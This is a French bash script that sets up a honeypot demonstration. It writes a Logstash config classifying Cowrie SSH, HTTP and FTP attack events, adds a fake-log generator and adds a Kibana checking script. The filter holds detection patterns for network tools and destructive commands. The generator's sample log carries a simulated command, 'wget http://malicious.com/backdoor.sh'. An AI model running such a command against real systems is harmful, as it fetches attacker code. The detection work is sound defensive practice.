#!/bin/bash
# INSTALLATION COMPLÈTE POUR DÉMONSTRATION PARFAITE
# Configuration garantie + Générateur de logs + Vérifications

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() { echo -e "${GREEN}[+] $1${NC}"; }
print_warning() { echo -e "${YELLOW}[!] $1${NC}"; }
print_error() { echo -e "${RED}[-] $1${NC}"; }
print_info() { echo -e "${BLUE}[i] $1${NC}"; }

if [ "$EUID" -ne 0 ]; then
    print_error "Ce script doit être exécuté en tant que root"
    exit 1
fi

echo ""
print_status "=== INSTALLATION DÉMONSTRATION HONEYPOT ==="
print_info "Configuration optimisée pour présentation projet"
echo ""

# 1. SAUVEGARDE COMPLÈTE
print_status "1. Sauvegarde de sécurité..."
BACKUP_DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/opt/demo-backup-$BACKUP_DATE"
mkdir -p "$BACKUP_DIR"

systemctl stop logstash
sleep 3

cp -r /etc/logstash/conf.d/* "$BACKUP_DIR/" 2>/dev/null || true
print_info "Sauvegarde créée : $BACKUP_DIR"

# 2. INSTALLATION CONFIG DÉMONSTRATION
print_status "2. Installation configuration démonstration..."

# Supprimer anciennes configs
rm -f /etc/logstash/conf.d/*.conf

# Installer la config optimisée
cat > /etc/logstash/conf.d/00-demo-honeypot.conf << 'EOF'
# =============================================================================
# CONFIGURATION LOGSTASH OPTIMISÉE POUR DÉMONSTRATION
# Indices séparés + Classification parfaite
# =============================================================================

input {
  tcp {
    port => 5046
    host => "0.0.0.0"
    codec => json_lines
    type => "honeypot_tcp"
  }
}

filter {
  # Supprimer les tags d'erreur JSON pour éviter les blocages
  if [tags] {
    mutate {
      remove_tag => ["_jsonparsefailure"]
    }
  }

  # ==========================================================================
  # DÉTECTION COWRIE SSH (par eventid)
  # ==========================================================================
  if [eventid] =~ /^cowrie\./ {
    mutate {
      add_field => { "honeypot_type" => "ssh" }
      add_field => { "honeypot_service" => "cowrie" }
      add_field => { "infrastructure" => "honeypot" }
    }
    
    # Standardiser les IPs
    if [src_ip] {
      mutate {
        add_field => { "client_ip" => "%{src_ip}" }
        add_field => { "source_ip" => "%{src_ip}" }
      }
    }
    
    # Enrichissement GeoIP
    if [src_ip] and [src_ip] != "127.0.0.1" and [src_ip] != "192.168.2.117" {
      geoip {
        source => "src_ip"
        target => "geoip"
        add_field => { "src_country" => "%{[geoip][country_name]}" }
        add_field => { "src_city" => "%{[geoip][city_name]}" }
      }
    }
    
    # Classification par événement
    if [eventid] == "cowrie.session.connect" {
      mutate {
        add_field => { "event_category" => "connection" }
        add_field => { "severity_level" => "info" }
        add_field => { "alert_score" => "3" }
        add_field => { "risk_level" => "low" }
      }
    }
    
    else if [eventid] == "cowrie.login.success" {
      mutate {
        add_field => { "event_category" => "authentication_success" }
        add_field => { "severity_level" => "critical" }
        add_field => { "alert_score" => "10" }
        add_field => { "risk_level" => "critical" }
        add_field => { "mitre_technique" => "T1078 - Valid Accounts" }
      }
    }
    
    else if [eventid] == "cowrie.login.failed" {
      mutate {
        add_field => { "event_category" => "authentication_failure" }
        add_field => { "severity_level" => "medium" }
        add_field => { "alert_score" => "5" }
        add_field => { "risk_level" => "medium" }
        add_field => { "mitre_technique" => "T1110 - Brute Force" }
      }
    }
    
    else if [eventid] == "cowrie.command.input" {
      mutate {
        add_field => { "event_category" => "command_execution" }
        add_field => { "severity_level" => "high" }
        add_field => { "alert_score" => "8" }
        add_field => { "risk_level" => "high" }
        add_field => { "mitre_technique" => "T1059 - Command Execution" }
      }
      
      # Analyser les commandes
      if [input] {
        mutate { add_field => { "command_executed" => "%{input}" } }
        
        # Outils réseau suspects
        if [input] =~ /(?i)(wget|curl|nc|netcat|nmap)/ {
          mutate {
            add_field => { "command_type" => "network_tool" }
            add_field => { "command_category" => "malicious" }
            add_field => { "alert_score" => "9" }
            add_field => { "risk_level" => "critical" }
          }
        }
        
        # Commandes destructives
        if [input] =~ /(?i)(rm -rf|dd if=|mkfs|fdisk)/ {
          mutate {
            add_field => { "command_type" => "destructive" }
            add_field => { "command_category" => "malicious" }
            add_field => { "alert_score" => "10" }
            add_field => { "risk_level" => "critical" }
          }
        }
      }
    }
    
    else if [eventid] == "cowrie.client.version" {
      mutate {
        add_field => { "event_category" => "client_identification" }
        add_field => { "severity_level" => "info" }
        add_field => { "alert_score" => "2" }
        add_field => { "risk_level" => "info" }
      }
    }
    
    else if [eventid] == "cowrie.session.closed" {
      mutate {
        add_field => { "event_category" => "disconnection" }
        add_field => { "severity_level" => "info" }
        add_field => { "alert_score" => "1" }
        add_field => { "risk_level" => "info" }
      }
    }
  }

  # ==========================================================================
  # DÉTECTION HTTP HONEYPOT (par attack_id + attack_type)
  # ==========================================================================
  else if [attack_id] and [attack_type] {
    mutate {
      add_field => { "honeypot_type" => "http" }
      add_field => { "honeypot_service" => "http_honeypot" }
      add_field => { "infrastructure" => "honeypot" }
    }
    
    # Standardiser les IPs
    if [ip] {
      mutate {
        add_field => { "client_ip" => "%{ip}" }
        add_field => { "source_ip" => "%{ip}" }
      }
    }
    
    # Enrichissement GeoIP
    if [ip] and [ip] != "127.0.0.1" and [ip] != "192.168.2.117" {
      geoip {
        source => "ip"
        target => "geoip"
        add_field => { "src_country" => "%{[geoip][country_name]}" }
        add_field => { "src_city" => "%{[geoip][city_name]}" }
      }
    }
    
    # Classification par type d'attaque
    if [attack_type] == "sql_injection" {
      mutate {
        add_field => { "event_category" => "web_attack" }
        add_field => { "severity_level" => "critical" }
        add_field => { "alert_score" => "9" }
        add_field => { "risk_level" => "critical" }
        add_field => { "mitre_technique" => "T1190 - Exploit Public Application" }
        add_field => { "owasp_category" => "A03 - Injection" }
      }
    }
    
    else if [attack_type] == "xss" {
      mutate {
        add_field => { "event_category" => "web_attack" }
        add_field => { "severity_level" => "high" }
        add_field => { "alert_score" => "7" }
        add_field => { "risk_level" => "high" }
        add_field => { "owasp_category" => "A07 - Cross-Site Scripting" }
      }
    }
    
    else if [attack_type] == "path_traversal" {
      mutate {
        add_field => { "event_category" => "web_attack" }
        add_field => { "severity_level" => "high" }
        add_field => { "alert_score" => "8" }
        add_field => { "risk_level" => "high" }
        add_field => { "mitre_technique" => "T1083 - File Discovery" }
      }
    }
    
    else if [attack_type] == "api_access" {
      mutate {
        add_field => { "event_category" => "api_enumeration" }
        add_field => { "severity_level" => "low" }
        add_field => { "alert_score" => "3" }
        add_field => { "risk_level" => "low" }
      }
    }
    
    # Analyser User-Agent
    if [user_agent] {
      if [user_agent] =~ /(?i)(sqlmap|nikto|nmap|burp|scanner)/ {
        mutate {
          add_field => { "client_type" => "security_scanner" }
          add_field => { "scanner_detected" => "true" }
          add_field => { "alert_score" => "8" }
        }
      } else if [user_agent] =~ /(?i)(curl|wget|python|powershell)/ {
        mutate {
          add_field => { "client_type" => "script" }
          add_field => { "alert_score" => "6" }
        }
      }
    }
  }

  # ==========================================================================
  # DÉTECTION FTP HONEYPOT (par honeypot_type=ftp)
  # ==========================================================================
  else if [honeypot_type] == "ftp" {
    mutate {
      add_field => { "honeypot_service" => "ftp_honeypot" }
      add_field => { "infrastructure" => "honeypot" }
    }
    
    # Standardiser les IPs
    if [ip] {
      mutate {
        add_field => { "client_ip" => "%{ip}" }
        add_field => { "source_ip" => "%{ip}" }
      }
    }
    
    # Enrichissement GeoIP
    if [ip] and [ip] != "127.0.0.1" and [ip] != "192.168.2.117" {
      geoip {
        source => "ip"
        target => "geoip"
        add_field => { "src_country" => "%{[geoip][country_name]}" }
        add_field => { "src_city" => "%{[geoip][city_name]}" }
      }
    }
    
    # Classification par événement FTP
    if [event_type] == "auth_success" {
      mutate {
        add_field => { "event_category" => "authentication_success" }
        add_field => { "severity_level" => "high" }
        add_field => { "alert_score" => "7" }
        add_field => { "risk_level" => "high" }
      }
    }
    
    else if [event_type] == "file_upload" {
      mutate {
        add_field => { "event_category" => "file_upload" }
        add_field => { "severity_level" => "high" }
        add_field => { "alert_score" => "8" }
        add_field => { "risk_level" => "high" }
      }
      
      # Analyser les fichiers suspects
      if [filename] {
        if [filename] =~ /(?i)(\.php|\.asp|\.exe|shell|backdoor|webshell)/ {
          mutate {
            add_field => { "malicious_file" => "true" }
            add_field => { "alert_score" => "10" }
            add_field => { "risk_level" => "critical" }
          }
        }
      }
    }
    
    else if [event_type] == "brute_force_detected" {
      mutate {
        add_field => { "event_category" => "brute_force_attack" }
        add_field => { "severity_level" => "critical" }
        add_field => { "alert_score" => "9" }
        add_field => { "risk_level" => "critical" }
      }
    }
  }

  # Ajouter métadonnées globales
  mutate {
    add_field => { "vm_source" => "192.168.2.117" }
    add_field => { "vm_destination" => "192.168.2.124" }
    add_field => { "environment" => "production" }
  }
  
  # Nettoyer les champs temporaires
  mutate {
    remove_field => [ "host", "port" ]
  }
}

# =============================================================================
# OUTPUTS SÉPARÉS PAR TYPE - INDICES DÉDIÉS POUR DÉMONSTRATION
# =============================================================================

output {
  # SSH Cowrie → Index dédié
  if [honeypot_type] == "ssh" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "honeypot-cowrie-%{+YYYY.MM.dd}"
      template_name => "honeypot-cowrie"
    }
  }
  
  # HTTP → Index dédié
  else if [honeypot_type] == "http" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "honeypot-http-%{+YYYY.MM.dd}"
      template_name => "honeypot-http"
    }
  }
  
  # FTP → Index dédié
  else if [honeypot_type] == "ftp" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "honeypot-ftp-%{+YYYY.MM.dd}"
      template_name => "honeypot-ftp"
    }
  }
  
  # Fallback pour logs non identifiés
  else {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "honeypot-unknown-%{+YYYY.MM.dd}"
    }
  }
}
EOF

# 3. PERMISSIONS ET VALIDATION
print_status "3. Configuration des permissions..."
chown logstash:logstash /etc/logstash/conf.d/00-demo-honeypot.conf
chmod 644 /etc/logstash/conf.d/00-demo-honeypot.conf

# 4. TEST DE SYNTAXE
print_status "4. Test de syntaxe..."
if sudo -u logstash /usr/share/logstash/bin/logstash --path.settings /etc/logstash -t; then
    print_status "✅ Syntaxe validée"
else
    print_error "❌ Erreur de syntaxe - Restauration backup"
    rm -f /etc/logstash/conf.d/*.conf
    cp "$BACKUP_DIR"/* /etc/logstash/conf.d/ 2>/dev/null
    exit 1
fi

# 5. DÉMARRER LOGSTASH
print_status "5. Démarrage de Logstash..."
systemctl start logstash

# Attendre le démarrage
print_info "Attente du démarrage (30s)..."
sleep 30

if ! systemctl is-active --quiet logstash; then
    print_error "❌ Erreur démarrage Logstash"
    journalctl -u logstash --no-pager -n 10
    exit 1
fi

print_status "✅ Logstash opérationnel"

# 6. INSTALLATION DU GÉNÉRATEUR DE DÉMO
print_status "6. Installation du générateur de démonstration..."

cat > /opt/demo_honeypot_attack.sh << 'DEMO_EOF'
#!/bin/bash
# GÉNÉRATEUR DE LOGS DE DÉMONSTRATION POUR PRÉSENTATION

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() { echo -e "${GREEN}[+] $1${NC}"; }
print_warning() { echo -e "${YELLOW}[!] $1${NC}"; }
print_info() { echo -e "${BLUE}[i] $1${NC}"; }

LOGSTASH_HOST="192.168.2.124"
LOGSTASH_PORT="5046"

send_log() {
    local log_data="$1"
    local log_type="$2"
    
    echo "$log_data" | nc -w 2 "$LOGSTASH_HOST" "$LOGSTASH_PORT" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "  ✓ $log_type envoyé"
    else
        echo "  ✗ Échec $log_type"
    fi
    sleep 0.5
}

demo_ssh_attack() {
    print_status "🔒 SIMULATION ATTAQUE SSH (Cowrie)"
    
    local attacker_ip="203.0.113.45"
    local session_id="demo$(date +%s)"
    local timestamp=$(date -Iseconds)
    
    # Connexion + échecs de login + succès + commandes malveillantes
    send_log '{"eventid":"cowrie.session.connect","src_ip":"'$attacker_ip'","dst_ip":"192.168.2.117","session":"'$session_id'","timestamp":"'$timestamp'","message":"New connection"}' "SSH Connection"
    
    timestamp=$(date -Iseconds)
    send_log '{"eventid":"cowrie.login.failed","username":"admin","password":"123456","src_ip":"'$attacker_ip'","session":"'$session_id'","timestamp":"'$timestamp'","message":"Failed login"}' "Failed Login"
    
    timestamp=$(date -Iseconds)
    send_log '{"eventid":"cowrie.login.success","username":"admin","password":"password123","src_ip":"'$attacker_ip'","session":"'$session_id'","timestamp":"'$timestamp'","message":"Successful login"}' "⚠️ SUCCESSFUL LOGIN"
    
    timestamp=$(date -Iseconds)
    send_log '{"eventid":"cowrie.command.input","input":"wget http://malicious.com/backdoor.sh","src_ip":"'$attacker_ip'","session":"'$session_id'","timestamp":"'$timestamp'","message":"Malicious command"}' "🚨 MALICIOUS COMMAND"
    
    print_info "✅ Attaque SSH simulée"
}

demo_http_attack() {
    print_status "🌐 SIMULATION ATTAQUE WEB (HTTP)"
    
    local attacker_ip="198.51.100.67"
    local timestamp=$(date -Iseconds)
    
    send_log '{"timestamp":"'$timestamp'","attack_id":"'$(openssl rand -hex 8)'","attack_type":"sql_injection","severity":"critical","ip":"'$attacker_ip'","user_agent":"sqlmap/1.6.12","method":"POST","path":"/search","honeypot":"http"}' "🚨 SQL Injection"
    
    timestamp=$(date -Iseconds)
    send_log '{"timestamp":"'$timestamp'","attack_id":"'$(openssl rand -hex 8)'","attack_type":"xss","severity":"high","ip":"'$attacker_ip'","user_agent":"Mozilla/5.0","method":"GET","path":"/comment","honeypot":"http"}' "🚨 XSS Attack"
    
    print_info "✅ Attaque HTTP simulée"
}

demo_ftp_attack() {
    print_status "📁 SIMULATION ATTAQUE FTP"
    
    local attacker_ip="172.16.254.89"
    local session_id="ftp_demo_$(date +%s)"
    local timestamp=$(date -Iseconds)
    
    send_log '{"honeypot_type":"ftp","timestamp":"'$timestamp'","event_type":"auth_success","session_id":"'$session_id'","ip":"'$attacker_ip'","username":"anonymous","message":"FTP login successful"}' "⚠️ FTP Login Success"
    
    timestamp=$(date -Iseconds)
    send_log '{"honeypot_type":"ftp","timestamp":"'$timestamp'","event_type":"file_upload","session_id":"'$session_id'","ip":"'$attacker_ip'","filename":"webshell.php","filesize":2048,"message":"Malicious file uploaded"}' "🚨 MALICIOUS FILE UPLOAD"
    
    timestamp=$(date -Iseconds)
    send_log '{"honeypot_type":"ftp","timestamp":"'$timestamp'","event_type":"brute_force_detected","ip":"'$attacker_ip'","attempts":5,"message":"Brute force detected"}' "🚨 BRUTE FORCE DETECTED"
    
    print_info "✅ Attaque FTP simulée"
}

case "${1:-demo}" in
    "ssh") demo_ssh_attack ;;
    "http") demo_http_attack ;;
    "ftp") demo_ftp_attack ;;
    "demo"|"all")
        print_status "🎯 SIMULATION COMPLÈTE POUR DÉMONSTRATION"
        echo ""
        demo_ssh_attack
        echo ""
        demo_http_attack
        echo ""
        demo_ftp_attack
        echo ""
        print_status "🎬 DÉMONSTRATION TERMINÉE !"
        print_warning "📊 Vérifiez dans Kibana les indices :"
        echo "   • honeypot-cowrie-$(date +%Y.%m.%d)"
        echo "   • honeypot-http-$(date +%Y.%m.%d)"
        echo "   • honeypot-ftp-$(date +%Y.%m.%d)"
        ;;
    *)
        echo "Usage: $0 [ssh|http|ftp|demo]"
        ;;
esac
DEMO_EOF

chmod +x /opt/demo_honeypot_attack.sh

# 7. SCRIPT DE VÉRIFICATION KIBANA
print_status "7. Création du script de vérification Kibana..."

cat > /opt/check_demo_kibana.sh << 'CHECK_EOF'
#!/bin/bash
# Vérification des données pour Kibana

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() { echo -e "${GREEN}[+] $1${NC}"; }
print_info() { echo -e "${BLUE}[i] $1${NC}"; }

echo ""
print_status "=== VÉRIFICATION DONNÉES KIBANA ==="
echo ""

# Vérifier les indices
print_status "📊 INDICES HONEYPOT:"
curl -s "http://192.168.2.124:9200/_cat/indices/honeypot-*?v&s=index" 2>/dev/null || echo "Aucun indice trouvé"
echo ""

# Comptage par type
print_status "🔢 COMPTAGE PAR TYPE:"
for type in cowrie http ftp; do
    count=$(curl -s "http://192.168.2.124:9200/honeypot-$type-*/_count" 2>/dev/null | jq -r '.count // 0')
    if [ "$count" -gt 0 ]; then
        echo "  ✅ honeypot-$type-*: $count documents"
    else
        echo "  ⚠️ honeypot-$type-*: Aucun document"
    fi
done
echo ""

# Exemples de données
print_status "📋 EXEMPLES DE DONNÉES:"
echo ""

echo "🔒 SSH/Cowrie:"
curl -s "http://192.168.2.124:9200/honeypot-cowrie-*/_search?size=1&_source=eventid,src_ip,client_ip,event_category,risk_level" 2>/dev/null | jq -r '.hits.hits[]._source | "  Event: \(.eventid // "N/A") | IP: \(.client_ip // .src_ip // "N/A") | Category: \(.event_category // "N/A") | Risk: \(.risk_level // "N/A")"' || echo "  Aucune donnée SSH"
echo ""

echo "🌐 HTTP:"
curl -s "http://192.168.2.124:9200/honeypot-http-*/_search?size=1&_source=attack_type,client_ip,event_category,risk_level,owasp_category" 2>/dev/null | jq -r '.hits.hits[]._source | "  Attack: \(.attack_type // "N/A") | IP: \(.client_ip // "N/A") | Category: \(.event_category // "N/A") | OWASP: \(.owasp_category // "N/A")"' || echo "  Aucune donnée HTTP"
echo ""

echo "📁 FTP:"
curl -s "http://192.168.2.124:9200/honeypot-ftp-*/_search?size=1&_source=event_type,client_ip,event_category,risk_level" 2>/dev/null | jq -r '.hits.hits[]._source | "  Event: \(.event_type // "N/A") | IP: \(.client_ip // "N/A") | Category: \(.event_category // "N/A") | Risk: \(.risk_level // "N/A")"' || echo "  Aucune donnée FTP"
echo ""

print_status "🎯 CHAMPS CLÉS POUR KIBANA:"
echo "  • honeypot_type (ssh/http/ftp)"
echo "  • client_ip, src_ip (géolocalisation)"
echo "  • event_category (type d'événement)"
echo "  • risk_level (critical/high/medium/low/info)"
echo "  • alert_score (0-10)"
echo "  • eventid (pour SSH Cowrie)"
echo "  • attack_type (pour HTTP)"
echo "  • event_type (pour FTP)"
echo "  • mitre_technique (MITRE ATT&CK)"
echo "  • owasp_category (classification OWASP)"
echo ""

print_status "📈 SUGGESTIONS DASHBOARDS:"
echo "  1. Carte mondiale des attaques (par client_ip)"
echo "  2. Timeline des événements critiques"
echo "  3. Top 10 des commandes SSH malveillantes"
echo "  4. Classification OWASP des attaques web"
echo "  5. Analyse des tentatives de brute force"
echo "  6. Détection de fichiers malveillants uploadés"
echo ""
CHECK_EOF

chmod +x /opt/check_demo_kibana.sh

# 8. TEST IMMÉDIAT DE LA CONFIGURATION
print_status "8. Test immédiat de la configuration..."

# Vérifier connectivité
if ! nc -z "192.168.2.124" "5046" 2>/dev/null; then
    print_error "❌ Port 5046 non accessible"
    exit 1
fi

print_status "✅ Port TCP 5046 accessible"

# Test d'envoi simple
print_info "Test d'envoi simple..."
echo '{"test": "demo_setup", "timestamp": "'$(date -Iseconds)'"}' | nc -w 2 192.168.2.124 5046 2>/dev/null
sleep 2

# 9. GÉNÉRATION D'UN ÉCHANTILLON DE DÉMONSTRATION
print_status "9. Génération d'un échantillon pour démonstration..."

print_info "Génération de logs de test..."
/opt/demo_honeypot_attack.sh demo >/dev/null 2>&1

# Attendre l'indexation
print_info "Attente de l'indexation (15s)..."
sleep 15

# Vérifier les résultats
print_status "10. Vérification des résultats..."
/opt/check_demo_kibana.sh

echo ""
print_status "=== INSTALLATION DÉMONSTRATION TERMINÉE ==="
echo ""
print_info "🎬 PRÊT POUR LA PRÉSENTATION !"
echo ""
print_warning "📋 ACTIONS POUR KIBANA :"
echo "1. Aller dans Kibana → Stack Management → Index Patterns"
echo "2. Créer les patterns d'index :"
echo "   • honeypot-cowrie-*"
echo "   • honeypot-http-*"  
echo "   • honeypot-ftp-*"
echo "3. Timestamp field: @timestamp pour tous"
echo ""
print_warning "🎯 POUR LA DÉMONSTRATION :"
echo "1. Simulation d'attaque: /opt/demo_honeypot_attack.sh demo"
echo "2. Vérification données: /opt/check_demo_kibana.sh"
echo "3. Redémarrer sender: systemctl restart honeypot-sender"
echo ""
print_warning "🔧 MAINTENANCE :"
echo "• Backup config: $BACKUP_DIR"
echo "• Logs Logstash: journalctl -u logstash -f"
echo "• API Logstash: curl http://192.168.2.124:9600/"
echo ""
print_status "✅ PROJET PRÊT POUR PRÉSENTATION DIMANCHE !"
echo ""